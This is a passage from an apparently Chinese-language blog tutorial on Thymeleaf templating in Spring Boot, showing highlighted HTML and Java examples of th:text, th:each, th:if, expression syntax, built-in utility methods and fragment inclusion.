punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;msg&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--不会转义html标签--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>utext</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;msgUtext&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:value 设置当前元素的value值，常用，优先级仅比th:text高--></span>姓名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;per.name&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>年龄：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;per.age&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/28/SpringBoot/image-20240709223856611.png" alt="image-20240709223856611"></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709224004960.png" alt="image-20240709224004960"></p></li><li><p><code>th:each</code>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:each 遍历列表，常用，优先级很高，仅此于代码块的插入，遍历被修饰的元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1px<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200px<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thead</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>编号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>年龄<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>操作<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>thead</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span> <span class="token attr-name"><span class="token namespace">th:</span>each</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>p:$&#123;pers&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>编号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.age&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>删除/修改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span> <span class="token attr-name"><span class="token namespace">th:</span>each</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>p,pState:$&#123;pers&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;pState.index+1&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.age&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>删除/修改<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/28/SpringBoot/image-20240709224536399.png" alt="image-20240709224536399"></p><p>对于<code>th:each=&quot;p,:$&#123;pers&#125;</code>，p是循环的每一项，pState是下标属性，包括：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index：列表状态的序号，从0开始；count：列表状态的序号，从1开始；size：列表状态，列表数据条数；current：列表状态，当前数据对象even：列表状态，是否为奇数，boolean类型odd：列表状态，是否为偶数，boolean类型first：列表状态，是否为第一条，boolean类型last：列表状态，是否为最后一条，boolean类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>th:if</code>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:if 条件判断，类似的有th:switch，th:case，优先级仅次于th:each,--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;map.Boss.name&#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;map.Boss.age gt 20&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中的关系运算：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">gt：great than（大于）ge：great equal（大于等于）eq：equal（等于）lt：less than（小于）le：less equal（小于等于）ne：not equal（不等于）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为boss的age属性大于20，所以会显示</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709225027975.png" alt="image-20240709225027975"></p></li></ul></li></ol><hr><h5 id="标准表达式语法"><a href="#标准表达式语法" class="headerlink" title="标准表达式语法"></a>标准表达式语法</h5><p><code>$&#123;&#125;</code>：变量表达式，有丰富的内置方法</p><ul><li><p>可以获取对象的属性和方法</p></li><li><p>可以使用内置对象：</p><ul><li>ctx：上下文对象</li><li>vars：上下文变量</li><li>locale：上下文的语言环境</li><li>request：仅在web上下文的 HttpServletRequest 对象</li><li>response：仅在web上下文的 HttpServletResponse 对象</li><li>session：仅在web上下文的 HttpSession对象</li><li>servletContext：仅在web上下文的 ServletContext 对象</li></ul><p>例子：</p><p>java 代码将用户名放在session中：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"userinfo"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>html里Thymeleaf通过内置对象直接获取：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">th:text="$&#123;session.userinfo&#125;"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>可以使用内置方法：</p><ul><li><p>dates：日期方法，常用的方法有：format，year，month，hour，createNow等</p></li><li><p>numbers：数值格式化方法，常用的方法有：formatDecimal等</p></li><li><p>strings：字符串格式化方法，常用的Java方法它都有。比如：equals，equalsIgnoreCase，length，trim，toUpperCase，toLowerCase，indexOf，substring，replace，startsWith，endsWith，contains，containsIgnoreCase等</p></li><li><p>bools：布尔方法，常用的方法有：isTrue，isFalse等</p></li><li><p>arrays：数组方法，常用的方法有：toArray，length，isEmpty，contains，containsAll等</p></li><li><p>lists，sets：集合方法，常用的方法有：toList，size，isEmpty，contains，containsAll，sort等</p></li><li><p>maps：对象方法，常用的方法有：size，isEmpty，containsKey，containsValue等</p></li></ul><p>例子： </p><p>在controller中绑定字符串</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"itdragonStr"</span><span class="token punctuation">,</span><span class="token string">"this is a DEMO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>html中使用内置方法：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>#strings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;not #strings.isEmpty(itdragonStr)&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Old Str : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;itdragonStr&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>toUpperCase : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.toUpperCase(itdragonStr)&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>toLowerCase : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.toLowerCase(itdragonStr)&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>equals : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.equals(itdragonStr, 'itdragonblog')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>equalsIgnoreCase : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.equalsIgnoreCase(itdragonStr, 'itdragonblog')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>indexOf : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.indexOf(itdragonStr, 'r')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>substring : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.substring(itdragonStr, 2, 8)&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>replace : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.replace(itdragonStr, 'it', 'IT')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>startsWith : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.startsWith(itdragonStr, 'it')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>contains : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.contains(itdragonStr, 'IT')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/28/SpringBoot/image-20240709231850749.png" alt="image-20240709231850749"></p></li></ul><br><p><code>@&#123;&#125;</code>：链接表达式</p><ul><li>无参：<code>@&#123;/xxx&#125;</code></li><li>有参：<code>@&#123;/xxx(k1=v1,k2=v2)&#125;</code> ，对应url结构：<code>xxx?k1=v1&amp;k2=v2</code></li><li>引入本地资源：<code>@&#123;/项目本地的资源路径&#125;</code></li><li>引入外部资源：<code>@&#123;/webjars/资源在jar包中的路径&#125;</code></li></ul><p>例子：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>引入外部资源<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>link th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/webjars/bootstrap/4.0.0/css/bootstrap.css&#125;"</span> rel<span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>引入本地资源<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>link th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/main/css/itdragon.css&#125;"</span> rel<span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>表单提交路径<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>form <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"form-login"</span> th<span class="token operator">:</span>action<span class="token operator">=</span><span class="token string">"@&#123;/user/login&#125;"</span> th<span class="token operator">:</span>method<span class="token operator">=</span><span class="token string">"post"</span> <span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>超链接跳转路径附带参数<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"btn btn-sm"</span> th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/login.html(l='zh_CN')&#125;"</span><span class="token operator">></span>中文<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"btn btn-sm"</span> th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/login.html(l='en_US')&#125;"</span><span class="token operator">></span><span class="token class-name">English</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><code>#&#123;&#125;</code>：消息表达式，用来读取配置文件中的数据，<code>th:text=&quot;#&#123;msg&#125;&quot;</code></p><br><p><code>~&#123;&#125;</code>：代码块表达式，支持两种结构：<code>~&#123;templatename::fragmentname&#125;</code>和<code>~&#123;templatename::#id&#125;</code></p><ul><li>templatename：模版名，Thymeleaf会根据模版名解析完整路径：<code>/resources/templates/templatename.html</code>，要注意文件的路径</li><li>fragmentname：片段名，Thymeleaf通过<code>th:fragment</code>声明定义代码块，即：<code>th:fragment=&quot;fragmentname&quot;</code></li><li>id：HTML的id选择器，使用时要在前面加上#号，不支持class选择器</li></ul><p>使用时要配合th属性（th:insert，th:replace，th:include）一起使用：</p><ul><li><code>th:insert</code>：将代码块片段整个插入到使用了th:insert的HTML标签中</li><li><code>th:replace</code>：将代码块片段整个替换使用了th:replace的HTML标签中</li><li><code>th:include</code>：将代码块片段包含的内容插入到使用了th:include的HTML标签中</li></ul><p>例子：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--th:fragment定义代码块标识--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name"><span class="token namespace">th:</span>fragment</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--三种不同的引入方式--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>insert</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer :: copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>replace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer :: copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>include</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer :: copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而渲染后的结果是：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--th:insert是在div中插入代码块，即多了一层div--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span>    <span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:replace是将代码块代替当前div，其html结构和之前一致--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:include是将代码块footer的内容插入到div中，即少了一层footer--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><code>*&#123;&#125;</code>：选择变量表达式，<code>*&#123;&#125;</code>只对<strong>选定对象</strong>评估表达式而不是整个上下文。只要没有选定的对象，<code>$&#123;...&#125;</code>和<code>*&#123;...&#125;</code>的语法就完全一样</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>object</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;user&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*&#123;name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>赛<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Age: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*&#123;age&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>18<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Detail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*&#123;detail&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>好好学习<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" 